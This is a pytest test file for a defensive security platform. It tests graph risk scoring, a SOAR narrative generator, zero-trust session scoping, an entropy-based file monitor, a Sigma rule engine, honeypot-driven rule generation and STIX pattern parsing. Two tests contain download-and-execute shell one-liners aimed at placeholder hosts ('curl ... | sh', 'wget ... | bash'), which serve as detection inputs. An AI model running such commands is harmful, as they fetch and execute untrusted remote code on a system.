"""Tests for the Phase 2 additions: graph.tgnn, soar.copilot, adaptive_learning.ztre,
sensors.ebpf_monitor, honeypot.deception_feedback, detection.sigma_engine,
threat_intel.stix_ingestor."""
import time
import pytest


# ── graph.tgnn ────────────────────────────────────────────────────────────────
class TestTemporalGraphScorer:
    @pytest.fixture
    def scorer(self):
        from graph.tgnn import TemporalGraphScorer
        return TemporalGraphScorer()

    def test_new_node_has_zero_energy(self, scorer):
        assert scorer._node_energy("unseen-node") == 0.0

    def test_malicious_edge_raises_energy(self, scorer):
        e0 = scorer._node_energy("10.0.0.20")
        scorer.on_edge("10.0.0.5", "10.0.0.20", is_malicious_hint=True)
        e1 = scorer._node_energy("10.0.0.20")
        assert e1 > e0

    def test_benign_edge_raises_energy_less_than_malicious(self, scorer):
        from graph.tgnn import TemporalGraphScorer
        s1, s2 = TemporalGraphScorer(), TemporalGraphScorer()
        s1.on_edge("a", "b", is_malicious_hint=False)
        s2.on_edge("a", "b", is_malicious_hint=True)
        assert s2._node_energy("b") >= s1._node_energy("b")

    def test_multi_hop_energy_compounds(self, scorer):
        scorer.on_edge("attacker", "pivot", is_malicious_hint=True)
        scorer.on_edge("pivot", "target", is_malicious_hint=True)
        assert scorer._node_energy("target") > 0

    def test_predict_attack_paths_returns_empty_without_graph(self, scorer):
        # no threat_graph wired up -> should return [] not raise
        assert scorer.predict_attack_paths("1.2.3.4") == []

    def test_stats_reports_tracked_nodes(self, scorer):
        scorer.on_edge("x", "y")
        s = scorer.stats()
        assert s["tracked_nodes"] >= 2
        assert s["embed_dim"] > 0


# ── soar.copilot ────────────────────────────────────────────────────────────────
class TestSOARCopilot:
    def _sample_run(self):
        return {"playbook": "critical_auto_response", "trigger": "IOC match",
                "src_ip": "1.2.3.4", "actions_taken": ["block_ip", "create_case"],
                "success": True, "case_id": "CASE-1"}

    def test_falls_back_to_template_when_no_llm_configured(self, monkeypatch):
        # Isolate this test from whatever AHRAS_LOCAL_LLM_URL happens to be set
        # to in the real environment (e.g. once Ollama is configured for actual
        # use) — force the "not configured" case directly on the shared client
        # module rather than asserting on ambient global state.
        import utils.llm_client as llm_client
        monkeypatch.setattr(llm_client, "LOCAL_LLM_URL", "")
        from soar.copilot import generate_narrative, is_llm_configured
        assert is_llm_configured() is False
        n = generate_narrative(self._sample_run(), risk_score=95)
        assert n.generated_by == "template"

    def test_incident_note_mentions_src_ip(self):
        from soar.copilot import generate_narrative
        n = generate_narrative(self._sample_run())
        assert "1.2.3.4" in n.incident_note

    def test_exec_summary_is_nontrivial(self):
        from soar.copilot import generate_narrative
        n = generate_narrative(self._sample_run())
        assert len(n.exec_summary) > 20

    def test_failed_run_reflected_in_note(self):
        from soar.copilot import generate_narrative
        run = self._sample_run()
        run["success"] = False
        n = generate_narrative(run)
        assert "FAILED" in n.incident_note or "manual" in n.exec_summary.lower()


# ── adaptive_learning.ztre ────────────────────────────────────────────────────────
class TestZTREEngine:
    @pytest.fixture
    def engine(self):
        from adaptive_learning.ztre import ZTREEngine
        return ZTREEngine()

    def test_low_risk_keeps_full_scope(self, engine):
        from adaptive_learning.ztre import AccessScope
        p = engine.update_session("s1", "alice", 10)
        assert p.scope == AccessScope.FULL

    def test_high_risk_revokes(self, engine):
        from adaptive_learning.ztre import AccessScope
        p = engine.update_session("s1", "alice", 95)
        assert p.scope == AccessScope.REVOKED
        assert p.ttl_seconds == 0

    def test_sharp_delta_shrinks_to_minimal(self, engine):
        from adaptive_learning.ztre import AccessScope
        engine.update_session("s1", "alice", 10)
        p = engine.update_session("s1", "alice", 40)   # +30 delta, sharp rise
        assert p.scope == AccessScope.MINIMAL

    def test_sustained_high_is_restricted_not_revoked(self, engine):
        from adaptive_learning.ztre import AccessScope
        engine.update_session("s1", "alice", 65)
        p = engine.update_session("s1", "alice", 68)   # small delta, still high
        assert p.scope == AccessScope.RESTRICTED

    def test_manual_revoke(self, engine):
        from adaptive_learning.ztre import AccessScope
        p = engine.revoke("s1", reason="manual test")
        assert p.scope == AccessScope.REVOKED

    def test_active_sessions_excludes_revoked(self, engine):
        engine.update_session("s1", "alice", 10)
        engine.update_session("s2", "bob", 95)   # revoked
        active = engine.active_sessions()
        assert "s1" in active
        assert "s2" not in active


# ── sensors.ebpf_monitor ────────────────────────────────────────────────────────
class TestEBPFFileMonitor:
    def test_falls_back_when_no_bcc(self):
        from sensors.ebpf_monitor import EBPFFileMonitor
        mon = EBPFFileMonitor(on_high_entropy_write=lambda e: None)
        # This sandbox has no root/bcc -> must be fallback-poll, not crash
        assert mon.mode in ("ebpf", "fallback-poll")

    def test_status_reports_mode(self):
        from sensors.ebpf_monitor import EBPFFileMonitor
        mon = EBPFFileMonitor(on_high_entropy_write=lambda e: None, watch_paths=["/tmp"])
        s = mon.status()
        assert "mode" in s and "note" in s

    def test_shannon_entropy_high_for_random_bytes(self):
        import os
        from sensors.ebpf_monitor import _shannon_entropy
        random_bytes = os.urandom(4096)
        entropy = _shannon_entropy(random_bytes)
        assert entropy > 7.0   # near-max entropy for random data

    def test_shannon_entropy_low_for_repetitive_bytes(self):
        from sensors.ebpf_monitor import _shannon_entropy
        flat = b"A" * 4096
        assert _shannon_entropy(flat) < 1.0

    def test_start_stop_does_not_raise(self):
        from sensors.ebpf_monitor import EBPFFileMonitor
        events = []
        mon = EBPFFileMonitor(on_high_entropy_write=events.append, watch_paths=["/tmp"])
        mon.start()
        time.sleep(0.1)
        mon.stop()
        assert mon.enabled is False


# ── detection.sigma_engine ────────────────────────────────────────────────────────
class TestSigmaEngine:
    @pytest.fixture
    def engine(self):
        from detection.sigma_engine.engine import SigmaEngine
        return SigmaEngine()

    def test_bundled_rules_loaded(self, engine):
        assert engine.stats()["loaded_rules"] >= 2

    def test_download_execute_pattern_matches(self, engine):
        matches = engine.match({"command": "curl http://evil.tld/x.sh | sh"})
        ids = [m.rule_id for m in matches]
        assert "ahras_bundled_download_execute" in ids

    def test_benign_command_does_not_match(self, engine):
        matches = engine.match({"command": "ls -la /home/user"})
        assert matches == []

    def test_ssh_honeypot_rule_matches(self, engine):
        matches = engine.match({"service": "SSH", "event_type": "login_attempt"})
        ids = [m.rule_id for m in matches]
        assert "ahras_bundled_ssh_bruteforce" in ids

    def test_add_rule_dict_and_match(self, engine):
        engine.add_rule_dict({
            "id": "test_custom_rule", "title": "Custom", "level": "low",
            "detection": {"selection": {"field|contains": ["needle"]}, "condition": "selection"},
        })
        matches = engine.match({"field": "a haystack with a needle in it"})
        assert any(m.rule_id == "test_custom_rule" for m in matches)

    def test_list_of_values_or_semantics(self, engine):
        engine.add_rule_dict({
            "id": "test_or_rule", "title": "OR test", "level": "low",
            "detection": {"selection": {"proto": ["tcp", "udp"]}, "condition": "selection"},
        })
        assert engine.match({"proto": "udp"})
        assert not engine.match({"proto": "icmp"})


# ── honeypot.deception_feedback ────────────────────────────────────────────────────
class TestDeceptionRuleGenerator:
    def _hit(self, data="wget http://bad.tld/payload | bash", src_ip="9.9.9.9"):
        class FakeHit:
            pass
        h = FakeHit()
        h.data = data
        h.src_ip = src_ip
        return h

    def test_extracts_download_execute_ttp(self):
        from honeypot.deception_feedback import DeceptionRuleGenerator
        gen = DeceptionRuleGenerator()
        results = gen.handle_hit(self._hit())
        labels = [r.label for r in results]
        assert "download_execute" in labels

    def test_generates_sigma_rule_when_engine_present(self):
        from honeypot.deception_feedback import DeceptionRuleGenerator
        from detection.sigma_engine.engine import SigmaEngine
        sigma = SigmaEngine()
        before = sigma.stats()["loaded_rules"]
        gen = DeceptionRuleGenerator(sigma_engine=sigma)
        gen.handle_hit(self._hit())
        after = sigma.stats()["loaded_rules"]
        assert after > before

    def test_generic_hit_with_no_ttp_still_recorded(self):
        from honeypot.deception_feedback import DeceptionRuleGenerator
        gen = DeceptionRuleGenerator()
        results = gen.handle_hit(self._hit(data="just poking around, hello?"))
        assert len(results) == 1
        assert results[0].label == "honeypot_interaction"

    def test_firewall_block_called_once_per_new_ip(self):
        from honeypot.deception_feedback import DeceptionRuleGenerator

        calls = []
        class FakeFirewall:
            def block_ip(self, ip, reason="", operator="system"):
                calls.append(ip)
                return {"success": True}

        gen = DeceptionRuleGenerator(firewall=FakeFirewall())
        gen.handle_hit(self._hit(src_ip="8.8.4.4"))
        gen.handle_hit(self._hit(src_ip="8.8.4.4"))   # same IP again
        assert calls == ["8.8.4.4"]   # only blocked once


# ── threat_intel.stix_ingestor ────────────────────────────────────────────────────
class TestSTIXTAXIIIngestor:
    def test_unconfigured_is_safe_noop(self):
        from threat_intel.stix_ingestor import STIXTAXIIIngestor
        ing = STIXTAXIIIngestor(taxii_url="", collection_id="")
        assert ing.is_configured() is False
        assert ing.sync() == []

    def test_status_reports_configuration(self):
        from threat_intel.stix_ingestor import STIXTAXIIIngestor
        ing = STIXTAXIIIngestor(taxii_url="", collection_id="")
        s = ing.status()
        assert s["configured"] is False

    def test_pattern_parser_ipv4(self):
        from threat_intel.stix_ingestor import _parse_stix_pattern
        result = _parse_stix_pattern("[ipv4-addr:value = '203.0.113.5']")
        assert result == ("ip", "203.0.113.5")

    def test_pattern_parser_domain(self):
        from threat_intel.stix_ingestor import _parse_stix_pattern
        result = _parse_stix_pattern("[domain-name:value = 'evil.example.com']")
        assert result == ("domain", "evil.example.com")

    def test_pattern_parser_hash(self):
        from threat_intel.stix_ingestor import _parse_stix_pattern
        result = _parse_stix_pattern("[file:hashes.'SHA-256' = 'abc123']")
        assert result == ("hash", "abc123")

    def test_pattern_parser_unsupported_returns_none(self):
        from threat_intel.stix_ingestor import _parse_stix_pattern
        assert _parse_stix_pattern("[process:name = 'evil.exe']") is None
